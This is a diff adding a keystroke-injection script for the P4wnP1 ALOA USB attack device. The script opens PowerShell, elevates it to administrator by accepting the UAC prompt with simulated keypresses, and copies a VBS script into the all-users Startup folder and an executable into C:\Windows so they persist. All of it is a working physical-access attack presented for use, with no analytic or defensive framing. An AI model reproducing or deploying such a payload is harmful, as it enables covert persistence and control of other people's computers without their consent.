@@ -1,0 +1,38 @@
+//run this on p4wnp1 aloa
+
+//1. opens powershell as admin
+//2. copies vbs script into startup
+//3. Copies exe into C Windows
+//4. Closes everything
+
+layout('fr'); //set layout us
+ 
+press("GUI r"); // windows + r
+delay(500);
+type("powershell\n"); // write powershell and press "enter"
+delay(500);
+type("Start=Process powershell =Verb runAs\n");
+delay(500);             // wait for the confirmation dialog
+press("LEFT");         // move focus to next button (don't save) with RIGHT ARROW
+press("SPACEBAR");      // confirm dialog with space
+
+
+delay(500);             // wait for the confirmation dialog
+type("Copy=Item =Path F:|autoexec196.vbs =Destination c:|ProgramData|Microsoft|Windows|'Start Menu'|Programs|StartUp \n");
+type("Copy=Item =Path G:|autoexec196.vbs =Destination c:|ProgramData|Microsoft|Windows|'Start Menu'|Programs|StartUp \n");
+type("Copy=Item =Path E:|autoexec196.vbs =Destination c:|ProgramData|Microsoft|Windows|'Start Menu'|Programs|StartUp \n");
+type("Copy=Item =Path D:|autoexec196.vbs =Destination c:|ProgramData|Microsoft|Windows|'Start Menu'|Programs|StartUp \n");
+
+type("Copy=Item =Path F:|newnoise.exe =Destination c:|Windows \n");
+type("Copy=Item =Path G:|newnoise.exe =Destination c:|Windows \n");
+type("Copy=Item =Path E:|newnoise.exe =Destination c:|Windows \n");
+type("Copy=Item =Path D:|newnoise.exe =Destination c:|Windows \n");
+
+delay(1000); 
+press("SPACEBAR");      // confirm dialog with space
+delay(800); 
+type("exit \n");
+delay(800);             // wait for the confirmation dialog
+type("exit \n");
+delay(800);             // wait for the confirmation dialog
+type("exit \n");
